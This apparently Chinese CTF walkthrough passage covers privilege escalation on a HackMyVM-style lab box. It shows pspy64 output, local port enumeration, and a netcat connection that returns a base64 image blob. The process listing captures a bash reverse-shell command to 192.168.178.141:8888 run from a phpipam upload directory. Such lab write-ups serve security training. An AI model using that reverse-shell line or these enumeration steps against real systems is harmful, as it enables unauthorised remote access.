+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x 3 italia italia 4096 Aug 18  2022 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Aug 18  2022 ..</span><br><span class="line">-rw------- 1 italia italia   98 Aug 18  2022 .Xauthority</span><br><span class="line">lrwxrwxrwx 1 italia italia    9 Aug 18  2022 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 italia italia  220 Aug 18  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 italia italia 3526 Aug 18  2022 .bashrc</span><br><span class="line">drwxr-xr-x 3 italia italia 4096 Aug 18  2022 .local</span><br><span class="line">-rw-r--r-- 1 italia italia  807 Aug 18  2022 .profile</span><br><span class="line">-rw-r--r-- 1 italia italia   66 Aug 18  2022 .selected_editor</span><br><span class="line">-rwxrwx--- 1 italia italia 9510 Aug 18  2022 pazz.php</span><br><span class="line">-rw------- 1 italia italia   24 Aug 18  2022 user.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>有一个pazz.php的文件，我们也没法看，不过提权肯定和这个文件有关</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ ./pspy64</span><br><span class="line">./pspy64</span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=1146   | ./pspy64 </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=1140   | bash -i </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=1139   | /bin/bash -c bash -i &gt;&amp; /dev/tcp/192.168.178.141/8888 0&gt;&amp;1 </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=1138   | sh -c /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.178.141/8888 0&gt;&amp;1&#x27; </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=1131   | php-fpm: pool www                                                             </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=1121   | </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=1120   | </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=1097   | </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=1094   | </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=1075   | </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=983    | bash -p </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=965    | </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=1000  PID=948    | bash </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=1000  PID=943    | (sd-pam) </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=1000  PID=942    | /lib/systemd/systemd --user </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=940    | su italia </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=938    | bash -i </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=937    | /bin/bash -c bash -i &gt;&amp; /dev/tcp/192.168.178.141/8888 0&gt;&amp;1 </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=936    | sh -c /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.178.141/8888 0&gt;&amp;1&#x27; </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=486    | php-fpm: pool www                                                             </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=485    | php-fpm: pool www                                                             </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=106   PID=480    | /usr/sbin/mariadbd </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=33    PID=449    | nginx: worker process                            </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=0     PID=446    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=1000  PID=385    | /usr/bin/php -q /home/italia/pazz.php </span><br><span class="line">2025/03/15 15:02:08 CMD: UID=1000  PID=362    | /bin/sh -c /usr/bin/php -q /home/italia/pazz.php </span><br></pre></td></tr></table></figure>
+
+<p><strong>我们发现这个php文件一直在被执行，我们看看本地端口信息</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ ss -tuln</span><br><span class="line">ss -tuln</span><br><span class="line">Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess</span><br><span class="line">udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      0          127.0.0.1:12345      0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*          </span><br><span class="line">tcp   LISTEN 0      511             [::]:80            [::]:*          </span><br><span class="line">tcp   LISTEN 0      32                 *:21               *:*   </span><br></pre></td></tr></table></figure>
+
+<p><strong>我们发现了一个12345端口，这很怪啊，我们监听一下</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">www-data@pam:~/html/phpipam/app/admin/import-export/upload$ nc 127.0.0.1 12345        </span><br><span class="line">&lt;/app/admin/import-export/upload$ nc 127.0.0.1 12345        </span><br><span class="line">a</span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=</span><br><span class="line"></span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAu4AAAHUCAIAAADqdjrLAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span><br><span class="line">jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABiKSURBVHhe7d3rdeLIFoDRicsBOR5H42QczL2S</span><br><span class="line">kN0YTj0klcCHtfefmXFDqVSwVN/QgP/7HwBAWlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiU</span><br><span class="line">AQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkA</span><br><span class="line">IDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQAS</span><br><span class="line">kzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEp</span><br><span class="line">AwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIA</span><br><span class="line">QGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAk</span><br><span class="line">JmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJS</span><br><span class="line">BgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUA</span><br><span class="line">gMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBI</span><br><span class="line">TMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSk</span><br><span class="line">DACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoA</span><br><span class="line">AIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQ</span><br><span class="line">mJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJ</span><br><span class="line">GQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQB</span><br><span class="line">ABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAg</span><br><span class="line">MSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRn4y74+P97vfXytf/wEX8uU3t7e/vtl</span><br><span class="line">+sE0r8+vTTMLz24aZP3jE1RnP+rIPwe5Ocp8mGWVNhwnfgLs88ynDZxJysBf9vVxux3O3j/XP36k</span><br><span class="line">eVONJnNr2q17t+rw7N5O2XGnvOia/X9v+1uq+xiLZZ2aR4qfAPs85WkDDyBl4C/7IymzaY9edAXJ</span><br><span class="line">g1Jm++ynSWzsma++zrvXSCcpA21SBh5q2vLulTfvv5Aye3fTt+Y0H5Ey2zPmW/9E9h/jW/GVLCkD</span><br><span class="line">bVIGHurzfd1XrpX3mKenzLGttFEDp6fM0RDoWehBsVE41KDRF1KGVyVl4KFypcyAjbQ213D4cSkT</span><br><span class="line">rvVGrdkMSo3iYaQMtEkZeKhUKTOiBTaf3aiUGRUBtfl0HGP+1NLF+oPI1ifAPlKGVyVl4KE2psz/</span><br><span class="line">vj4D2z7yvFd1F13erbrOY/pn9dNN215yGJQytQxbJ/9r9pVzLT485RUqvpk3WqrNsTS/KXmHdUh4</span><br><span class="line">OVIGHmpryjxPeZ8uvEW1/EGh0l59XspUIqPYVeU37xYen8JBuk7gqmiqj/55SwSvQ8rAQ6VJmVIM</span><br><span class="line">1LfR0msh8Rmetk8XS6ax0tumH9560/Tnz7PVby9loE3K8Oetr45vv3iv97tYfzbAOuDF+rN+D0+Z</span><br><span class="line">daIX6896FHb11lQLERFvvqft0zsnv3H6j3gspQy0SRme53P5bvdbP/+XGr2poP1FsrX3PcyD73yf</span><br><span class="line">ydFh529QW6z3uXX5w/n81jusfu73S7MnPj/K071MuPBWjh+FPb1jo44zItx9z9qn909+012lDPwN</span><br><span class="line">Uobnqe15tS8dK1zIg/QpaAfRlTHDFnbIO7cbYXy/8nbZP9tF8d2pW4LkVnzXaM5n7dMHJl9Y8fC+</span><br><span class="line">/Se6n5SBNinD8xQ3nMa+370p1vTlzLBhewc6lDKbZ7uKguYR23Q84dNSpm/y8SJuSJmxq3TWEsEr</span><br><span class="line">kTI8TyFlah+LnQT7xN4tvLHljBy2d6zb+8b3Cyde2lj73A4pZX4JJ1V5UOekHZIbZy0RvBIpw/Ps</span><br><span class="line">2XuD7aiyoTRVdrexw/aOdnvP+H7BtMeGjJS5EU+q/ai+vb2/fxz5IqCzlgheiZTheTbvvuEV/Nge</span><br><span class="line">XtwUBg/b3vQu9qbMkeluWFYp81vvw7q6hM2mrtl4hMiABYW/TcrwPK3td77wLy4X8/iKXBvkZoBY</span><br><span class="line">vMGNH3b9OHQ48Py3ERfrjX90pkxhussnlS5fD7z8I/pcU2GDj0fsq4Fu6VOm/kSpmZ5EXU0jZaBN</span><br><span class="line">yvA8lV1g/mb29VYX01YcXo9LY9xdvsvf5RrtcCcNOwlHLm+y+1OmtoHNRbU0TflG8Qr01UC3F0iZ</span><br><span class="line">0h06Nd99LmWgTcrwPKVe2LBhFoYoDBDfOrjSnzTsLLxx+YT7Uia6Vcci1l4ViE+qY9AtwrPLljKT</span><br><span class="line">Y71RHfvY0IsBCwp/m5TheQrBsOXKGw5RHqB3iztp2Fl42/ImG+9kd7ePJ7y8L2PnNrblnHZ7lZSZ</span><br><span class="line">VX6FU9vWJ8AmAxYU/jYpw/PEG86W7bJzo//RefuThl2ckzLxzX5ZviV4Mr95piNwpMwv3ZNqfNFy</span><br><span class="line">UekAHY9si5Th5UkZnifecLZceDs3+n/6QuKkYRcbbjrrnUq8lg3l7/otDVhZgz3Cs8udMlemYFze</span><br><span class="line">af0+/+6JdZyywhHi6Sxh2qvxCyshPynD88QbjpS51j2VwpbXVnjj6ZEa6BZO+mVS5s6UNpVfKxEf</span><br><span class="line">4qwlglciZXieeMORMte2TCVezx7BePFglTXY46x9+sjk4xUfGQ/xEQrHOGuJ4JVIGZ4n3nCkzLWN</span><br><span class="line">U5l/kfZ6m23uRjzw4Hx9zu/JufURzPmsffrIMyte8cHxEE4wPMZZSwSvRMrwPEc2nIuTmuOkYRcb</span><br><span class="line">bjrbPJXZ/BaNvjdo/HM7ZHzg1pFn8T0fuk9vmMKd+FnZcd5b9D+sZy0RvBIpw/M8PmU6b3/SsItH</span><br><span class="line">pMyN+VuEl2/7vbwFdR3j1s2Y8YE7Hp3CHcMph7cdsU/vf2rF99y44k39D+tpSwQvRMrwPMdTJh6i</span><br><span class="line">PEJ8xPsd5KRhZ+Ftyxtl/563wVc0idsxC0nSOna8FoV7nbZP75z89vvN35pc/hhYUf8T7LQlghci</span><br><span class="line">ZXieeNfbdJneNkT3rU8adhbeuLzDxntreWf96NtXg2HvxoxPa1L+rv1SCZQmfN4+XZxJbfTNd/q5</span><br><span class="line">Q+1j7fcKxwkX6bwlgtchZXiebcEQK+2399ttcZ+KdpCThp3EIxduXBo+vvnPbZsbazTq/ZjFlpmP</span><br><span class="line">cL8QlW+7LZ1eeHZj9uni4xIvz9dn+fbFGd0u0PwVLvWFn49TWqb4KCcuEbwMKcPzxFvltst0Zcea</span><br><span class="line">tqxpZyn8Puh/wm32pGEnxT5Yv87s5m7xRKLBg4GnnXWa6fJWmW/zG4LDSUfLXmmZi8ucJ+t/x8qP</span><br><span class="line">aGGZ10G36Vu5a+sdm++OLjyUtdVZvlh5/a3ki/ltSvUDFVbpzCWCVyFleJ4RKdOx39aVLu8nDdsa</span><br><span class="line">t29Dvhu9vW+3xBM+uAqz2uN5fNr/3J/AmNELj+TIqc8Khzl5ieA1SBmeZ0zKHLrYVy7uzxn29p7x</span><br><span class="line">zW9udTw4iot+dCetP5pHR78Wrfnx8UuP5IDGu1Z+wpy9RPAKpAzPMyhl9l/uG5f2c4atj3p73/jW</span><br><span class="line">v241YFetzvjAb3xuLPAj9ukjv6+6+lQcN/cHHab9cEBWUobnGZYyk+07VtdxThm21h63u01Hysw3</span><br><span class="line">OrBfT4M1Z7xnP+15Z8Zj9uldRwne2HxvfqvzsTN4a/2uRykDbVKG5xmZMpPaR2hubPkqkDOGLe9P</span><br><span class="line">u1JmUf1VhQXNjfSfLcO3P8izetw+veFRnOff//SY7Fn5Sd8qSRlokzI8z+CUWSzbSvniP3+K42vH</span><br><span class="line">+OOH/Yr/j35/yqyW377cfK1g9zo0tu1le+4f98H7dHP23Q0WmkavPktW244iZaBNyvCqlk8ef5s/</span><br><span class="line">h7z+/KAzhp2HWa0/GWQecZ3qxcBD/B563LiPcfbspxHPW3rgNykDACQmZQCAxKQMAJCYlAEAEpMy</span><br><span class="line">AEBiUgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMA</span><br><span class="line">JCZlAIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBi</span><br><span class="line">UgYASEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZl</span><br><span class="line">AIDEpAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYA</span><br><span class="line">SEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDE</span><br><span class="line">pAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzK</span><br><span class="line">AACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwA</span><br><span class="line">kJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJ</span><br><span class="line">SRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiU</span><br><span class="line">AQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkA</span><br><span class="line">IDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQAS</span><br><span class="line">kzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEp</span><br><span class="line">AwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIA</span><br><span class="line">QGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAk</span><br><span class="line">JmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJS</span><br><span class="line">BoCn+fr8+Hh/e3v779r032/vHx+fX+uNaqYB3nf76DnCja/P9c43Pj7XG+TyFS3fnnV5JikDwBNM</span><br><span class="line">SfA7YEJT0tSL5uujY5SS9+358fm+3vfGjqH+hPB8sp2MlAHgwTb2x1vlVYLHpkzpaLUZ/m1SBgA2</span><br><span class="line">2hUfxVZ4aMq82ksyEykDAJvsTo9CzDwwZV7vJZmJlAGADcaHx+NSpnSkbPv+b1IGAPqV/oLmYv7g</span><br><span class="line">UrVLoh32YSlTmHvql2QmUgYAuhVL5u3Xx5TKn20Kttg4Zd4/v3qsY3QoFVP2kpEyANBtw+sahXII</span><br><span class="line">blpKmfWPBylFWLY9/56UAYBOhTyJt834xk9KmcLM878kM5EyAEw73bX1ZwOsA87Wnxy0Dnax/uyB</span><br><span class="line">4lc2CrvmX0qZTC/JrI/uYv1RXVfKrAOOetKsoy3WHx0jZQB2+Jq/ML/4JtXlO2p3XaUrwza/+Day</span><br><span class="line">/mKAdYg7/b8gYIR19/pl/aNb3d1zfsoUSubvvCRTfS7Oj3DtuVhNmWXg9WffpgH3PLcPTbJFygBs</span><br><span class="line">0veF+4vpAt1/eY62jcC8kaz3qOsc79uuUDpNIR+2pcyye07b57f59yRt3i9Lf7k0Mpb2++p+jJcC</span><br><span class="line">We91rZwypTNfdD8NJ8cn2SJlALpVr+4FXRfnbQO3XxDYM9HZ3wiaLfkQ3/Z9Spj1X+9sOsc//JLM</span><br><span class="line">jsc4KIVCyvQM3lNzYybZImUA+uy4Kq8a1/w9A1f30sL+2+nZrzcUlyM8552PSl+LlAZ/9hIdeTLe</span><br><span class="line">nHn4XHkr/5XkL41VHDbJFikD0Gv/pbmy9+0dtHi1zx0y5dnHMzvlMVkV5jK/rLMov9XnZPtP+u55</span><br><span class="line">c+zZcsYTeyZlAM4zOjyOXO/jbeTI3rRxBxmvMvnCpjl+Ab91j/zov5U7cMqdf8G0QWkNh06yRcoA</span><br><span class="line">bHN9kZ52sfmtpJf/O5//WXyvbVwJxQv++pmOi9Kg0ZjlVxIuLyVMo82izzXVd/bz1Xa/YmQd2DIr</span><br><span class="line">o062DvywDGxMbH5788XtAxwmQiVllufg5dlS/OxR6VkzdpItUgZgs/lTTOVrbnwZjy758S2nodc/</span><br><span class="line">vxLeNNg+g62pumHPpzKP/LCduKS2+VUm19gzG8oD73q14hExWDzh8Bm5PL7zn5aerqXzvLv9NND6</span><br><span class="line">Rzf6n9iTfZNskTIAw0VX8mDXDC/4xd21a9DoRh0b7LPe9PGjVg6VkCms4ezystblNt9b5b3S2uwq</span><br><span class="line">mcnpMVM639qBvyoPb3yi8ZJ333b0JFukDMB4wUU/uOJHW0Ptah/c/u7m4Xaz/m3VepM/p5gjs0Yc</span><br><span class="line">FO57f6/ufXgW37hLY75HxTPbf9D4+VKIx94bj55ki5QBXtrOPenoVTc4bN8Vv7SJLIJt++721Sy4</span><br><span class="line">uHxd3PyFcX0fwjl5DWszri7HIrx3eOj4OOFNd57xxcgR78aKT6K9TEXhxEoPXecSDp9ki5QBXto5</span><br><span class="line">2/DX/E7I9zkJCtZhrt1fyaMr/tv6RstYcIe7me464+Vlm3WAO+es4ao2eN8I3cJDRRtsvBUv5rfC</span><br><span class="line">Tg/R/OivP7kXTXvUGnbGRL9wYqXxDqXMgUm2SBngpY3ehvu/hP1WX8psdj/T3cOW3sk8eg2v1IYe</span><br><span class="line">vvWFB4tSpjCr25tueSPsqDWUMhEpA7y0UVvIYudgFyelTLQVH5hodOJD1/BK7fzD0zooPI/gQPG8</span><br><span class="line">Nix0cNNRazi8EsKJlcbrPPrwSbZIGeCljduGaxtvj/v97eiIi9Kev/vlo/tTH7eG12pnf86uF55H</span><br><span class="line">b3YU1vnQmG13CzG8EsKJlcbrPPrwSbZIGeCljdpC9g70z4NT5uLnTT3rrXvcnfuwNbxSGbN+RgeE</span><br><span class="line">x+zNjsLZ9O7ao9ZQykSkDPDSRm0hhXH+fWvpb0E79KXM2/v6Dt9uW/b9r9l8p48pcIqv2tye/Kg1</span><br><span class="line">/Kcy4raQ+fy4vM36l/fCEOFRpcw6xrXSeFIGIK+wOiqbbrBB9O2Z23byw8J3rp6458zije5i66G3</span><br><span class="line">bJrdtw1398IDEw565oMYTu7AQ7blZLsPPnqSLVIGoC24Nlf3q77bh/vgoAv+5/zLodZ/rwnmcN6W</span><br><span class="line">M4l3ucWeAoiHi0aKSyY62e7mKd10z4n0KpxG9ZDza3Hrv97ZUh3diz16ki1SBqAtuIhXN/zg9tF1</span><br><span class="line">fMs+cvHVVSg/W0n1+2Jm0aZTPbNj4hNe7DxqYcTb1S5srvHuWhjz/tcS7dixDyudyXTY6KH+9+uN</span><br><span class="line">1h/c6Fy/SenA0ciDJ9kiZQDaogt+eccKL+RbNs3oK16ufj92Y68MBr18sdv8P74/5jcEh/vNaTtx</span><br><span class="line">cX9brG90qQv2utISziNe3rgUvXNpFZ9rZaKXhVzWrnibvRtyp+oyzud8+ZbF5e3e608vwnlVl+/n</span><br><span class="line">GVN6rkw2L+GOSbZIGYC20pX5e2dbze+mHXjJny/6s/U/rpW+zq41YIfTduLjUwvnVt6Mm0rVdmim</span><br><span class="line">J5fMkdkFKXhg9RbjlzDq1QYpA9Dh+DZcuubv30uCEY9uTOVpDnBSyuwft7Jn7l7IE9fvn4H1dvAZ</span><br><span class="line">c8YSbl9EKQPQ4/A+XL4877/m34x5cFuabf8/4n5npcxkz5k3TnXXYj4kZGYH1vL3eR96zjROd9gk</span><br><span class="line">W6QMQJ+DoVC97K9ve9wi/PqU/b8ialb6S6tBTkyZzYP3NMfW+e74m5EjdjxngimGz+r3j55T71nD</span><br><span class="line">MZNskTIAvb4/aFE3N0awQbQu/H2DL6Yj1KKj9ibNkjCMBjs1ZSa9Kxh/iibU/aA8Yv3ubXjOlJ40</span><br><span class="line">ccpMy9wYuqdjLgZMskXKAGxR/TDH9P+Tly/H2JEyi+pnRa4P0GEZq/JBm4tNQx5zdsos+h6fTaaF</span><br><span class="line">rH0Iah50veVTNJ4z8wQrfVBMmUl83rtO+NgkW6QMwC7zR1S/zZ9XXX88yvIR2B+Hx/893GT+wfpn</span><br><span class="line">r+n6hEed669F/HsLOM3o9/xGnfU64jTk+qMDzpiklAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAk</span><br><span class="line">JmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMApPW///0fnhRRXLJhxqQAAAAASUVO</span><br><span class="line">RK5CYIJTYWx0ZWRfX54VlA40aUEkKV8ULE+OjZv5Z6cblsROzw==</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们监听一段时间后，随便发点东西，发现它重复发下面的密文，猜测是一个base64，我们去解密一下</strong></p>
+<p><img src="/2025/03/15/hack-my-vm-pam/2.png" alt="2"></p>
